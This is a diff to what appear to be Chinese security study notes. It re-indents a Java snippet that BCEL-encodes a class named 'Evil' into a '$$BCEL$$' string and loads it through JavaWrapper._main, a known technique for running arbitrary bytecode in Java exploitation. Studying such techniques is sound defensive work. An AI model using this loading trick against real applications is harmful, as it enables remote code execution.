@@ -314,15 +314,15 @@ public class Evil {
 ```
 
 ```java
-    public static void main(String[] args) throws Exception {
-        JavaWrapper._main(new String[]{getBCEL(), "p4d0rn"});
-    }
+public static void main(String[] args) throws Exception {
+    JavaWrapper._main(new String[]{getBCEL(), "p4d0rn"});
+}
 
-    public static String getBCEL() throws Exception {
-        JavaClass javaClass = Repository.lookupClass(Evil.class);
-        String encode = Utility.encode(javaClass.getBytes(), true);
-        return "$$BCEL$$" + encode;
-    }
+public static String getBCEL() throws Exception {
+    JavaClass javaClass = Repository.lookupClass(Evil.class);
+    String encode = Utility.encode(javaClass.getBytes(), true);
+    return "$$BCEL$$" + encode;
+}
 ```
 
 > 输出
